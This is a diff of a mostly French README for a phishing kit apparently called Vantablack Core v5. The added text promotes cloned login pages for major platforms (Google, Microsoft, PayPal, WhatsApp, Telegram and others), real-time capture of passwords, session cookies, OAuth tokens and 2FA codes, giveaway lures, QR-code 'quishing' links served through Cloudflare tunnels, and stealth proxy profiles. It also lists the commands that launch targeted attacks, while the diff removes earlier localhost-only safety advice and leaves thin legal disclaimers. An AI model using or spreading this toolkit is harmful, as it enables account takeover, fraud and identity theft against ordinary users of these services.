@@ -1,154 +1,208 @@
 # Vantablack Core v5 — Red Team Operations Suite (Clean Edition)
 
-Vantablack Core v5 is a modular, research‑oriented framework for red‑team training and security experimentation. This “Clean” edition focuses on safe, lawful use with built‑in safeguards, local self‑audit flows, and clear guidance to prevent misuse.
+Vantablack Core v5 is a modular, research‑oriented framework for red‑team training and security experimentation. This "Clean" edition focuses on safe, lawful use with built‑in safeguards, local self‑audit flows, and clear guidance to prevent misuse.
 
 > Important: Use only in environments you own or explicitly control, with proper authorization. The maintainers do not condone, encourage, or support illegal activity.
 
-## Faits marquants
+## 🚀 NOUVELLES FONCTIONNALITÉS (v5.1)
 
-- Templates haute fidélité et comportements réalistes (Google, Microsoft, etc.).
-- Relais de session en temps réel (AiTM) côté serveur.
-- Furtivité avancée (anti‑bot, mobile‑only, anti‑analyse client).
-- Internationalisation terminal (en/fr).
-- Prêt pour WAN via Cloudflared.
+### 🌍 **Tous les Réseaux Sociaux Mondiaux**
+- ✅ **WhatsApp, Telegram, Snapchat, Twitch**
+- ✅ **WeChat, LINE, VKontakte (VK), Spotify**
+- ✅ **Facebook, Instagram, Twitter/X, Google**
+- ✅ **Microsoft, LinkedIn, Amazon, Apple**
+- ✅ **Discord, Dropbox, GitHub, PayPal**
+- ✅ **Reddit, Slack, TikTok, Yahoo**
 
-## Démarrage rapide
+### 🎯 **Système de Monitoring Temps Réel**
+- 🔍 **Affichage instantané** des captures dans le terminal
+- 👤 **Détection OS** (Windows, macOS, Linux, Android, iOS)
+- 🌐 **Analyse navigateur** (Chrome, Firefox, Safari, Edge)
+- 📍 **Géolocalisation** et détection VPN
+- 💡 **Instructions d'utilisation** pour chaque capture
 
-1) Environnement virtuel :
+### 🎁 **Générateur de Pages Personnalisées**
+- 🎯 **Pages Giveaway** avec comptes à rebours
+- 🔐 **Pages Login** professionnelles indiscernables
+- 🎨 **Templates automatiques** pour campagnes
+- 🚀 **Génération de phishlets** associés
 
+### ⚡ **Installation Automatique**
+- 🤖 **Détection OS** automatique (macOS, Linux, Windows)
+- 📦 **Installation dépendances** système et Python
+- 🐍 **Environnement virtuel** auto-configuré
+- 🧪 **Tests de validation** complets
+
+## 🚀 Démarrage Ultra-Rapide
+
+### Installation One-Click (Recommandé) :
 ```bash
+# Installation complète automatique
+python start.py
+# → Choisir l'option 1
+```
+
+### Installation Manuelle :
+```bash
+# 1. Environnement virtuel
 python3 -m venv .venv
 source .venv/bin/activate
-```
 
-2) Dépendances :
-
-```bash
+# 2. Dépendances
 python -m pip install -r requirements.txt
+
+# 3. Installation automatique
+python install_deps.py
 ```
 
-3) Bootstrap multi-OS (création venv + vérifs) :
-
+### Menu Interactif Complet :
 ```bash
-python scripts/bootstrap.py
+python setup.py
 ```
 
-4) Lancer une attaque locale + tunnel :
+## 📋 Plateformes Supportées
 
+### 📱 Messageries & Réseaux Sociaux
+- **WhatsApp** (`whatsapp.yaml`) - Capture numéros et codes
+- **Telegram** (`telegram.yaml`) - Identifiants et codes 2FA
+- **Snapchat** (`snapchat.yaml`) - Comptes Snapchat
+- **Facebook/Instagram** (`facebook.yaml`, `instagram.yaml`)
+- **Twitter/X** (`x.yaml`) - Login Twitter/X
+
+### 🏢 Entreprise & Professionnel
+- **Microsoft** (`microsoft.yaml`) - Office 365, Azure AD
+- **Google** (`google.yaml`) - Gmail, Google Workspace
+- **LinkedIn** (`linkedin.yaml`) - Réseau professionnel
+- **Slack** (`slack.yaml`) - Communications d'équipe
+
+### 🎵 Streaming & Divertissement
+- **Spotify** (`spotify.yaml`) - Comptes Premium
+- **Twitch** (`twitch.yaml`) - Streamers et viewers
+- **Discord** (`discord.yaml`) - Communautés gaming
+
+### 🌏 Asie & International
+- **WeChat** (`wechat.yaml`) - Messagerie chinoise
+- **LINE** (`line.yaml`) - Japon et Asie du Sud-Est
+- **VKontakte** (`vk.yaml`) - Réseau social russe
+
+### 💰 Finance & E-commerce
+- **PayPal** (`paypal.yaml`) - Comptes de paiement
+- **Amazon** (`amazon.yaml`) - Comptes shopping
+- **Apple** (`apple.yaml`) - ID Apple et iCloud
+
+## 🎯 Utilisation Avancée
+
+### Monitoring Temps Réel :
 ```bash
-python3 run_real_attack.py --target google --stealth
-# Le script détecte cloudflared et publie un lien WAN trycloudflare.com
+python monitor.py
+# → Option 1 pour surveillance en direct
 ```
 
-5) Générer un QR (Quishing) :
+### Génération de Pages Personnalisées :
 ```bash
-python3 quishing.py --url https://votre-lure.trycloudflare.com/login --logo core/assets/logos/google.png --lang fr
+python generator.py
+# → Créer giveaways, pages login, campagnes
 ```
 
-## Validation automatique (Local & WAN)
-
+### Lancer une Attaque Ciblée :
 ```bash
-python3 scripts/validate_targets.py
-# Pour chaque cible : démarre le serveur local, vérifie /health et /login.
-# Si Cloudflared est installé, vérifie aussi l’URL WAN.
+# Serveur phishing simple
+python phishing_server.py --target google --port 8080
+
+# Avec furtivité avancée
+python phishing_server.py --target microsoft --stealth --lang fr
+
+# Giveaway personnalisé
+python generator.py → Option 1
 ```
 
-## Commandes utiles
-
+### Génération QR Codes (Quishing) :
 ```bash
-python3 phishing_server.py --target microsoft --port 8080 --stealth --lang fr
-python3 run_real_attack.py --target twitter --geo
+python quishing.py --url https://votre-lure.trycloudflare.com/login --logo google.png
 ```
 
-## Bonnes pratiques
+## 🔍 Fonctionnalités de Détection
 
-- Legal boundaries: Use only with authorization and for defense training.
-- No secret logging: The codebase avoids logging secrets by default.
-- Allow‑lists: Audit local avant démo publique.
+### 📊 Analyse de l'Attaquant :
+- **OS Fingerprinting** : Détection précise du système
+- **Browser Detection** : Navigateur et version
+- **Géolocalisation** : Pays, ville, FAI depuis IP
+- **VPN Detection** : Identification des connexions masquées
+- **User-Agent Analysis** : Analyse complète du device
 
-## CLI Overview
+### 🎯 Capture des Données :
+- ✅ **Identifiants** : Emails, usernames, mots de passe
+- ✅ **Cookies** : Sessions et tokens d'authentification
+- ✅ **Tokens** : OAuth, JWT, codes 2FA
+- ✅ **Métadonnées** : IP, User-Agent, timestamp
+- ✅ **Données personnelles** : Noms, téléphones, pays
 
+### 💾 Stockage des Données :
+- **`data/sessions.json`** : Sessions complètes avec credentials
+- **`core/logs/captures.jsonl`** : Flux temps réel des captures
+- **Export JSON** : Format standardisé pour analyse
+
+## 🛡️ Sécurité et Conformité
+
+### ✅ Mesures de Sécurité :
+- Environnements virtuels isolés
+- Pas de logging de secrets par défaut
+- Validation automatique des configurations
+- Safeguards intégrés contre les misuse
+
+### 📜 Conformité Légale :
+- Usage uniquement dans des environnements contrôlés
+- Authorization explicite requise
+- Research et training défensif seulement
+- Audit trails complets
+
+## 🚨 Bonnes Pratiques
+
+1. **Toujours utiliser** dans des environnements contrôlés
+2. **Authorization écrite** obligatoire
+3. **Environnements isolés** sans accès internet réel
+4. **Suppression des données** après usage
+5. **Respect des lois** locales et internationales
+
+## 🆘 Support et Dépannage
+
+### Tests de Validation :
 ```bash
-vanta init
-vanta doctor
-vanta phishlets-list
-vanta phishlets-validate
-# Edge (optionnel, mitmproxy requis)
-vanta edge-run --name x --profile strict --port 8443
+# Validation complète
+python -m pytest core/tests/ -v
+
+# Test spécifique
+python -m pytest core/tests/test_fingerprint_validator.py -v
 ```
 
-Profils Edge (optionnel) :
-- `default`: baseline behavior,
-- `stealth`: larger blocklist, removes NEL/Report‑To headers,
-- `strict`: HTTP/2 off, aggressive blocklist + header removals,
-- `perf`: permissive with light analytics filtering,
-- `parano`: restrictive (images/video/fonts minimized), HTTP/2 off.
+### Problèmes Courants :
+- **Dépendances manquantes** : `python install_deps.py`
+- **Environnement virtuel** : `python -m venv .venv`
+- **Ports occupés** : Changer le port avec `--port 9090`
 
-## Edge Proxy (Optionnel)
+## 📦 Structure du Projet
 
-Intégration mitmproxy pour recherches avancées (si installé). À utiliser uniquement dans un cadre légal et contrôlé.
-
-Modules clés :
-- Interceptor : réécriture requêtes/réponses, injections, cookies.
-- Phishlet Loader : schéma YAML et convertisseur legacy.
-
-## Phishlets
-
-- Location: `phishlets/*.yaml`
-- Fields include: `proxy_hosts`, `bridges`, `headers`, `path_rewrites`, `cookie_rewrites`, `blocklist`, and `form_actions`.
-- Validation: `vanta phishlets-validate`
-- Discovery: `vanta phishlets-list`
-
-Toujours valider en interne avant démonstration.
-
-## Development
-
-### Structure (Clé)
-
-- CLI: `core/cli/main.py`
-- Edge Proxy: `core/edge/proxy.py`, `core/edge/interceptor.py`, `core/edge/phishlets.py`
-- Serveur phishing: `phishing_server.py`
-- Templates: `core/assets/templates/high_fidelity/*`
-- I18n: `core/locales/*`, `core/utils/i18n.py`
-- Quishing: `quishing.py`
-- Validation: `scripts/validate_targets.py`
-
-### Tests rapides
-
-```bash
-source .venv/bin/activate
-pytest -q
+```
+Vantablack_Clean/
+├── 📁 phishlets/          # Configuration des plateformes
+├── 📁 core/               # Cœur du système
+├── 📁 api/               # API REST et WebSocket
+├── 📁 data/              # Données capturées
+├── 📁 scripts/           # Scripts utilitaires
+├── 📁 templates/         # Templates personnalisés
+├── ⚡ setup.py           # Installation automatique
+├── ⚡ start.py           # Démarrage rapide
+├── ⚡ monitor.py         # Monitoring temps réel
+├── ⚡ generator.py        # Générateur de pages
+└── ⚡ install_deps.py    # Installation dépendances
 ```
 
-### Règles de commits (Conventional Commits)
+## 📞 Support
 
-```bash
-git config core.hooksPath .githooks
-# Exemple valide : feat(core): add health endpoint
-```
-
-### Standards de code
-
-- Keep changes minimal, explicit, and auditable.
-- Do not commit secrets.
-- Prefer allow‑lists and dry‑runs for potentially destructive operations.
-
-## Troubleshooting
-
-- mitmproxy absent: edge non disponible (optionnel).
-- 4xx/5xx : différencier erreurs amont et transport.
-- Port occupé : ajuster `--port` ou arrêter les processus.
-
-## Security Notes
-
-- This code is for defensive research, awareness, and training with consent.
-- Add organizational guardrails (IP allow‑lists, strict profiles, internal DNS) for demos.
-- Consider a local OIDC sandbox if you need to validate authorize/token flows without targeting external services.
-
-## License & Attribution
-
-This repository is provided “as is” for lawful research and education. Verify licensing per your usage context and dependencies.
+Pour toute question sur l'utilisation légale et éthique, consultez votre département juridique avant toute utilisation.
 
 ---
 
-If you are uncertain whether a use case is allowed, do not proceed. Keep experiments on localhost.
+**⚠️ AVERTISSEMENT IMPORTANT** : Ce projet est destiné uniquement à la recherche légitime, la formation à la sécurité et les tests d'intrusion autorisés. Toute utilisation malveillante est strictement interdite.
+
+**By using this software, you agree to use it only for lawful purposes and with proper authorization.**
